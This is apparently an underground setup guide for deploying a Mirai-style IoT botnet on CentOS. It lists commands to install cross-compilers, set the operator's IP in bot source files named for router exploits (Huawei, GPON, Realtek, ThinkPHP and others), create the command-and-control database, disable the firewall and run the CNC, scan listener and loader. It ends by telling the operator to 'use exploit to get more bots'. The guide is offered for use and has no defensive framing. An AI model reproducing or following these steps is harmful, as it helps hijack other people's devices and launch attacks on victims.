Setup write by zxcr9999
Install on Centos 7.x
Basic configuration of vps: 2vCores 4GB RAM 20SSD


yum update -y
yum install epel-release -y
yum groupinstall "Development Tools" -y
yum install gmp-devel -y
ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10
yum install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y


// Install golang to fix build.sh
cd /tmp
wget https://dl.google.com/go/go1.13.linux-amd64.tar.gz
sha256sum go1.13.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.13.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
export GOROOT=/usr/local/go
export GOPATH=$HOME/Projects/Proj1
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords
source ~/.bash_profile
go version
go env
cd ~/


mkdir /etc/xcompile
cd /etc/xcompile 
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i686.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2
wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2
wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-x86_64.tar.bz2
tar -jxf cross-compiler-i586.tar.bz2
tar -jxf cross-compiler-i686.tar.bz2
tar -jxf cross-compiler-m68k.tar.bz2
tar -jxf cross-compiler-mips.tar.bz2
tar -jxf cross-compiler-mipsel.tar.bz2
tar -jxf cross-compiler-powerpc.tar.bz2
tar -jxf cross-compiler-sh4.tar.bz2
tar -jxf cross-compiler-sparc.tar.bz2
tar -jxf cross-compiler-armv4l.tar.bz2
tar -jxf cross-compiler-armv5l.tar.bz2
tar -jxf cross-compiler-armv6l.tar.bz2
tar -jxf cross-compiler-armv7l.tar.bz2
tar -jxf cross-compiler-x86_64.tar.bz2
rm -rf *.tar.bz2
mv cross-compiler-i586 i586
mv cross-compiler-i686 i686
mv cross-compiler-m68k m68k
mv cross-compiler-mips mips
mv cross-compiler-mipsel mipsel
mv cross-compiler-powerpc powerpc
mv cross-compiler-sh4 sh4
mv cross-compiler-sparc sparc
mv cross-compiler-armv4l armv4l
mv cross-compiler-armv5l armv5l
mv cross-compiler-armv6l armv6l
mv cross-compiler-armv7l armv7l
mv cross-compiler-x86_64 x86_64


 CHANGE IP(s) IN /bot/includes.h
 CHANGE IP(s) IN /bot/huawei.c
 CHANGE IP(s) IN /bot/asus.c
 CHANGE IP(s) IN /bot/comtrend.c
 CHANGE IP(s) IN /bot/dlink_scanner.c
 CHANGE IP(s) IN /bot/gpon443.c
 CHANGE IP(s) IN /bot/jaws.c
 CHANGE IP(s) IN /bot/linksys.c
 CHANGE IP(s) IN /bot/gpon80_scanner.c
 CHANGE IP(s) IN /bot/netlink.c
 CHANGE IP(s) IN /bot/tr064.c
 CHANGE IP(s) IN /bot/realtek.c
 CHANGE IP(s) IN /bot/thinkphp.c
 CHANGE IP(s) IN /bot/hnap_scanner.c
 CHANGE IP(s) IN /cnc/main.go
 CHANGE IP(s) IN /loader/src/main.c
 CHANGE IP(s) IN /loader/src/headers/config.h
 CHANGE IP(s) IN /scanListen.go
 CHANGE IP(s) IN /dlr/main.c
------------------------------
------------------------------------------

// Install mysql on centos 7.x

yum install mariadb-server -y
systemctl start mariadb.service
mysql_secure_installation
AND CHANGE YOUR PASSWORD MYSQL IN cnc/main.go


mysql -pYOURPASSWORD


CREATE DATABASE cosmic;
use cosmic;
CREATE TABLE `history` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned NOT NULL,
  `time_sent` int(10) unsigned NOT NULL,
  `duration` int(10) unsigned NOT NULL,
  `command` text NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`)
);
 
CREATE TABLE `users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(32) NOT NULL,
  `password` varchar(32) NOT NULL,
  `duration_limit` int(10) unsigned DEFAULT NULL,
  `cooldown` int(10) unsigned NOT NULL,
  `wrc` int(10) unsigned DEFAULT NULL,
  `last_paid` int(10) unsigned NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  `admin` int(10) unsigned DEFAULT '0',
  `intvl` int(10) unsigned DEFAULT '30',
  `api_key` text,
  PRIMARY KEY (`id`),
  KEY `username` (`username`)
);
 
CREATE TABLE `whitelist` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(16) DEFAULT NULL,
  `netmask` tinyint(3) unsigned DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `prefix` (`prefix`)
);
INSERT INTO users VALUES (NULL, 'USERNAME', 'PASSWORD', 0, 0, 0, 0, -1, 1, 30, '');
INSERT INTO users VALUES (NULL, 'USERNAME2', 'PASSWORD2', 0, 0, 0, 0, -1, 1, 30, '');
exit;

------------------------------------------------------------------------------------

iptables -F 
service httpd restart  
service mariadb.service restart

------------------------------------------------------------------------------------



nano /usr/include/bits/typesizes.h
scroll down and edit the 1024 to 999999
THEN SAVE IT 
ulimit -n999999; ulimit -u999999; ulimit -e999999

------------------------------------------------------------------------------------
cd ~/
chmod 0777 * -R
sh build.sh
ulimit -n999999; ulimit -u999999; ulimit -e999999

cd
screen ./cnc
CTRL A+D

cd loader
screen ./scanListen
CTRL A+D

// How to connect botnet server
Telnet port 1312

// How to load bots
cd loader
cat *.txt | ./loader

NOTE: Use exploit to get more bots, all instructions are in the files
 ------------------------------------------------------------------------------------
